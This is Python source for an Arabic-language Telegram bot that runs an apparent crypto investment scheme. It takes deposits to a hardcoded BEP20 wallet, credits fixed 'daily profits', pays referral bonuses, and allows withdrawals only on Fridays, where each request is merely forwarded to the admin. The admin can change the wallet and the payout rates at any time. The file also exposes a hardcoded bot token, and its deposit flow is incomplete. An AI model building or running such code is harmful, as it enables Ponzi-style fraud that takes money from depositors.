import telebot
from telebot import types
import sqlite3
import os
import time
from datetime import datetime
from apscheduler.schedulers.background import BackgroundScheduler

# --- 1. الإعدادات الأساسية ---
CONFIG = {
    'TOKEN': '7941946883:AAERwK7lzjt1_xe-iarb5SkE8IXJs-abfrk', 
    'ADMIN_ID': 8499302703, 
    'CHANNEL_ID': '@AP_Fl', 
    'CHANNEL_LINK': 'https://t.me/AP_Fl'
}

bot = telebot.TeleBot(CONFIG['TOKEN'])
DB_NAME = 'bot_database.db'

# --- 2. إدارة قاعدة البيانات ---
def get_db_connection():
    conn = sqlite3.connect(DB_NAME, timeout=20)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with get_db_connection() as conn:
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS users
                     (uid TEXT PRIMARY KEY, full_name TEXT, balance REAL, withdrawable_profit REAL,
                      referred_by TEXT, referrals_count INTEGER, active_referrals INTEGER,
                      has_deposited INTEGER, deposit_amount REAL, pending_amount REAL)''')
        c.execute('''CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT)''')
        
        default_settings = [
            ('wallet', '0x31d62d87fd666d3e4837c2de682adf1e21510295'),
            ('profit_20', '0.6'),
            ('profit_100', '3.3'),
            ('profit_300', '10.0'),
            ('support_link', 'https://t.me/ContactUsCOINSGLOPAL22_bot?start=98875970')
        ]
        c.executemany("INSERT OR IGNORE INTO settings VALUES (?, ?)", default_settings)
        conn.commit()

def get_setting(key):
    with get_db_connection() as conn:
        res = conn.execute("SELECT value FROM settings WHERE key=?", (key,)).fetchone()
        return res[0] if res else "0"

def get_user(uid):
    with get_db_connection() as conn:
        return conn.execute("SELECT * FROM users WHERE uid=?", (str(uid),)).fetchone()

def update_user(uid, **kwargs):
    with get_db_connection() as conn:
        for key, value in kwargs.items():
            conn.execute(f"UPDATE users SET {key}=? WHERE uid=?", (value, str(uid)))
        conn.commit()

init_db()

# --- 3. نظام الأرباح التلقائي ---
def calculate_profit(amount):
    try:
        if amount == 20: return float(get_setting('profit_20'))
        elif amount == 100: return float(get_setting('profit_100'))
        elif amount == 300: return float(get_setting('profit_300'))
    except: return 0
    return 0

def add_daily_profits():
    with get_db_connection() as conn:
        users = conn.execute("SELECT * FROM users WHERE deposit_amount > 0").fetchall()
        for user in users:
            profit = calculate_profit(user['deposit_amount'])
            if profit > 0:
                new_balance = user['balance'] + profit
                new_withdraw = user['withdrawable_profit'] + profit
                conn.execute("UPDATE users SET balance=?, withdrawable_profit=? WHERE uid=?", (new_balance, new_withdraw, user['uid']))
                try: bot.send_message(user['uid'], f"💰 **أرباح يومية جديدة!**\n📈 تم إضافة: `+{profit}$`.")
                except: continue
        conn.commit()

scheduler = BackgroundScheduler()
scheduler.add_job(add_daily_profits, 'interval', hours=24)
scheduler.start()

# --- 4. لوحة تحكم المدير ---
@bot.message_handler(commands=['admin'])
def admin_panel(message):
    if message.from_user.id != CONFIG['ADMIN_ID']: return
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("📝 تغيير المحفظة", callback_data='adm_edit_wallet'),
        types.InlineKeyboardButton("💵 تعديل الأرباح", callback_data='adm_edit_profits'),
        types.InlineKeyboardButton("🔗 تعديل رابط الدعم", callback_data='adm_edit_support'),
        types.InlineKeyboardButton("📊 الإحصائيات", callback_data='adm_stats')
    )
    bot.send_message(message.chat.id, "🛠 **لوحة تحكم المدير**", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('adm_'))
def admin_callbacks(call):
    if call.from_user.id != CONFIG['ADMIN_ID']: return
    if call.data == 'adm_edit_support':
        msg = bot.send_message(call.message.chat.id, "🔗 أرسل رابط الدعم الجديد:")
        bot.register_next_step_handler(msg, lambda m: [update_setting('support_link', m.text), bot.send_message(m.chat.id, "✅ تم التحديث")])
    elif call.data == 'adm_edit_wallet':
        msg = bot.send_message(call.message.chat.id, "✉️ أرسل عنوان BEP20 الجديد:")
        bot.register_next_step_handler(msg, lambda m: [update_setting('wallet', m.text), bot.send_message(m.chat.id, "✅ تم التحديث")])
    elif call.data == 'adm_stats':
        with get_db_connection() as conn:
            res = conn.execute("SELECT COUNT(*), SUM(deposit_amount) FROM users").fetchone()
            bot.send_message(call.message.chat.id, f"👤 المشتركون: {res[0]}\n💰 الإيداعات: {res[1] or 0}$")

def update_setting(key, value):
    with get_db_connection() as conn:
        conn.execute("UPDATE settings SET value=? WHERE key=?", (value, key))
        conn.commit()

# --- 5. نظام المستخدم (الإحالة، السحب، الإيداع) ---
@bot.message_handler(commands=['start'])
def start(message):
    uid = str(message.from_user.id)
    user = get_user(uid)
    if not user:
        args = message.text.split()
        ref = args[1] if len(args) > 1 else None
        with get_db_connection() as conn:
            conn.execute("INSERT INTO users (uid, balance, withdrawable_profit, referrals_count, active_referrals, has_deposited, deposit_amount, pending_amount, referred_by) VALUES (?, 0, 0, 0, 0, 0, 0, 0, ?)", (uid, ref))
            if ref: conn.execute("UPDATE users SET referrals_count = referrals_count + 1 WHERE uid=?", (ref,))
            conn.commit()
        user = get_user(uid)
    
    if not user['full_name']:
        msg = bot.send_message(message.chat.id, "👋 يرجى إرسال اسمك الثلاثي:")
        bot.register_next_step_handler(msg, save_name)
    else: show_menu(message)

def save_name(message):
    update_user(message.from_user.id, full_name=message.text)
    show_menu(message)

def show_menu(message):
    user = get_user(message.from_user.id)
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(types.InlineKeyboardButton("📥 إيداع", callback_data='u_dep'), types.InlineKeyboardButton("📤 سحب", callback_data='u_wit'))
    markup.add(types.InlineKeyboardButton("💰 رصيدي", callback_data='u_bal'), types.InlineKeyboardButton("👥 الإحالات", callback_data='u_ref'))
    markup.add(types.InlineKeyboardButton("👨‍💻 الدعم الفني", url=get_setting('support_link')))
    bot.send_message(message.chat.id, f"🏠 **لوحة التحكم**\n💰 الرصيد المتاح: `{user['withdrawable_profit']:.2f}$`", reply_markup=markup, parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: call.data == 'u_ref')
def ref_system(call):
    user = get_user(call.from_user.id)
    link = f"https://t.me/{bot.get_me().username}?start={call.from_user.id}"
    bot.send_message(call.message.chat.id, f"👥 **نظام الإحالة**\nرابطك: `{link}`\n💰 مكافأتك: 1$ عن كل إيداع إحالة.", parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: call.data == 'u_wit')
def withdraw_req(call):
    if datetime.now().strftime("%A") != "Friday":
        bot.answer_callback_query(call.id, "⚠️ السحب متاح فقط يوم الجمعة!", show_alert=True)
        return
    bot.send_message(call.message.chat.id, "أدخل المبلغ للسحب:")
    bot.register_next_step_handler(call.message, process_wit)

def process_wit(message):
    # (نظام السحب المعتاد مع إرسال العنوان للأدمن)
    bot.send_message(message.chat.id, "💳 أرسل عنوان BEP20:")
    bot.register_next_step_handler(message, lambda m: bot.send_message(CONFIG['ADMIN_ID'], f"📤 طلب سحب بقيمة {message.text}$ من {m.from_user.id}\nالعنوان: `{m.text}`"))

@bot.callback_query_handler(func=lambda call: call.data == 'u_dep')
def dep_logic(call):
    user = get_user(call.from_user.id)
    if user['has_deposited']:
        bot.answer_callback_query(call.id, "⚠️ مسموح بإيداع واحد فقط.", show_alert=True)
        return
    # اختيار الباقات (كما في الكود السابق)
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("20$", callback_data='v_20'))
    bot.edit_message_text("اختر الباقة:", call.message.chat.id, call.message.message_id, reply_markup=markup)

# --- تفعيل القبول والرفض وتوزيع عمولة الإحالة ---
@bot.callback_query_handler(func=lambda call: call.data.startswith('app_'))
def approve_dep(call):
    # عند القبول، يتم إضافة 1$ للمحيل تلقائياً
    data = call.data.split('_'); uid = data[1]; amt = float(data[2])
    user = get_user(uid)
    update_user(uid, balance=amt, has_deposited=1, deposit_amount=amt)
    if user['referred_by']:
        ref = get_user(user['referred_by'])
        update_user(ref['uid'], withdrawable_profit=ref['withdrawable_profit'] + 1.0, active_referrals=ref['active_referrals'] + 1)
    bot.send_message(uid, "✅ تم تفعيل حسابك!")
    bot.delete_message(call.message.chat.id, call.message.message_id)

if __name__ == "__main__":
    bot.infinity_polling()
